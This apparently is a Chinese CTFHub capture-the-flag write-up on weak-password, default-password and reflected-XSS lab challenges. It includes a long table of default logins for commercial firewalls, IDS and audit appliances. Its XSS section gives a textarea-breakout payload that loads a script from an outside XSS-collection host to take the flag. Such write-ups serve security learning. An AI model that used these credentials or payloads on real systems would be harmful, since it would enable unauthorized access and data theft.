# CTFHub-密码口令+XSS

<div class="has-toc have-toc">
</div>

## 0x00 前言

菜鸡记录汇总下密码口令+XSS的学习过程。

## 0x01 弱口令

题目：通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。

简单试了下admin/123456就解出来了，这道题应该是使用bp的intruder模块进行字典的爆破。<figure class="wp-block-image size-large">

<img loading="lazy" width="440" height="474" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-86.png" alt="" class="wp-image-1776" /> </figure> 

## 0x02 默认口令

<figure class="wp-block-image size-large">

<img loading="lazy" width="1002" height="614" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-87.png" alt="" class="wp-image-1781" /> </figure> 

<pre id="block-d26c634c-c445-4e41-844a-5cdcd134570d" class="wp-block-preformatted">根据提示搜索默认用户名和密码。</pre>

<pre class="wp-block-code"><code>&lt;strong>常见的网络安全设备默认密码：&lt;/strong>
设备     默认账号     默认密码
深信服产品    sangfor/sangfor|sangfor@2018|sangfor@2019
深信服科技 AD        dlanrecover
深信服负载均衡 AD 3.6    admin/admin
深信服WAC ( WNS V2.6)    admin/admin
深信服VPN    Admin/Admin
深信服ipsec-VPN (SSL 5.5)    Admin/Admin
深信服AC6.0    admin/admin
SANGFOR防火墙    admin/sangfor
深信服AF(NGAF V2.2)    admin/sangfor
深信服NGAF下一代应用防火墙(NGAF V4.3)    admin/admin
深信服AD3.9    admin/admin
深信服上网行为管理设备数据中心    Admin/密码为空
SANGFOR_AD_v5.1    admin/admin
网御漏洞扫描系统    leadsec/leadsec
天阗入侵检测与管理系统 V7.0    Admin/venus70
Audit/venus70
adm/venus70
天阗入侵检测与管理系统 V6.0    Admin/venus60
Audit/venus60
adm/venus60
网御WAF集中控制中心(V3.0R5.0)    admin/leadsec.waf
audit/leadsec.waf
adm/leadsec.waf
联想网御    administrator/administrator
网御事件服务器    admin/dmin123
联想网御防火墙PowerV    administrator/administrator
联想网御入侵检测系统    lenovo/default
网络卫士入侵检测系统    admin/talent
网御入侵检测系统V3.2.72.0    adm/leadsec32
admin/leadsec32
联想网御入侵检测系统IDS    root/111111
admin/admin123
科来网络回溯分析系统    csadmin/colasoft
中控考勤机web3.0    administrator/123456
H3C iMC    admin/admin
H3C SecPath系列    admin/admin
H3C S5120-SI    test/123
H3C智能管理中心    admin/admin
H3C ER3100    admin/adminer3100
H3C ER3200    admin/adminer3200
H3C ER3260    admin/adminer3260
H3C    admin/adminer
admin/admin
admin/h3capadmin
h3c/h3c
360天擎    admin/admin
网神防火墙    firewall/firewall
天融信防火墙NGFW4000    superman/talent
黑盾防火墙    admin/admin
rule/abc123
audit/abc123
华为防火墙    telnetuser/telnetpwd
ftpuser/ftppwd
方正防火墙    admin/admin
飞塔防火墙    admin/密码为空
Juniper_SSG__5防火墙    netscreen/netscreen
中新金盾硬件防火墙    admin/123
kill防火墙(冠群金辰)    admin/sys123
天清汉马USG防火墙    admin/venus.fw
Audit/venus.audit
useradmin/venus.user
阿姆瑞特防火墙    admin/manager
山石网科    hillstone/hillstone
绿盟安全审计系统    weboper/weboper
webaudit/webaudit
conadmin/conadmin
admin/admin
shell/shell
绿盟产品        admin/nsfocus123
admin/Nsf0cus!@#
admin/nsf0cus.
admin/Nsf0cus!@
TopAudit日志审计系统    superman/talent
LogBase日志管理综合审计系统    admin/safetybase
网神SecFox运维安全管理与审计系统    admin/!1fw@2soc#3vpn
天融信数据库审计系统    superman/telent
Hillstone安全审计平台    hillstone/hillstone
网康日志中心    ns25000/ns25000
网络安全审计系统（中科新业）    admin/123456
天玥网络安全审计系统    Admin/cyberaudit
明御WEB应用防火墙    admin/admin
admin/adminadmin
明御攻防实验室平台    root/123456
明御安全网关    admin/adminadmin
明御运维审计与册风险控制系统    admin/1q2w3e
system/1q2w3e4r
auditor/1q2w3e4r
operator/1q2w3e4r
明御网站卫士    sysmanager/sysmanager888
亿邮邮件网关    eyouuser/eyou_admin
eyougw/admin@(eyou)
admin/+-ccccc
admin/cyouadmin
Websense邮件安全网关    administrator/admin
梭子鱼邮件存储网关    admin/admin</code></pre>

<p id="block-d26c634c-c445-4e41-844a-5cdcd134570d">
  尝试后得出flag。
</p><figure class="wp-block-image size-large">

<img loading="lazy" width="656" height="38" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-88.png" alt="" class="wp-image-1783" /> </figure> 

## 0x03 反射型

<figure class="wp-block-image size-large">

<img loading="lazy" width="1339" height="399" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-89.png" alt="" class="wp-image-1784" /> </figure> 

先在第一个输入`<script>alert('hannibal')</script>`，发现存在xss漏洞。<figure class="wp-block-image size-large">

<img loading="lazy" width="510" height="163" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-90.png" alt="" class="wp-image-1786" /> </figure> 

第二个输入框输入URL，尝试使用<a rel="noreferrer noopener" href="http://xsscom.com//index.php" data-type="URL" data-id="http://xsscom.com//index.php" target="_blank" rel="nofollow" >XSS Platform</a><figure class="wp-block-image size-large">

<img loading="lazy" width="722" height="496" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-91.png" alt="" class="wp-image-1788" /> </figure> 

这里选择默认即可。<figure class="wp-block-image size-large">

<img loading="lazy" width="364" height="401" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-92.png" alt="" class="wp-image-1789" /> </figure> 

然后，选中`</textarea>'"><script src=http://xsscom.com//MwHaMs></script>`<figure class="wp-block-image size-large">

<img loading="lazy" width="751" height="157" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-93.png" alt="" class="wp-image-1790" /> </figure> 

首先在第一个输入框输入`<script src=http://xsscom.com//MwHaMs></script>`，然后再把submit后的url输入第二个输入框中。在XSS Platform中找到flag的信息。<figure class="wp-block-image size-large">

<img loading="lazy" width="591" height="603" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/07/图片-94.png" alt="" class="wp-image-1792" /> </figure>
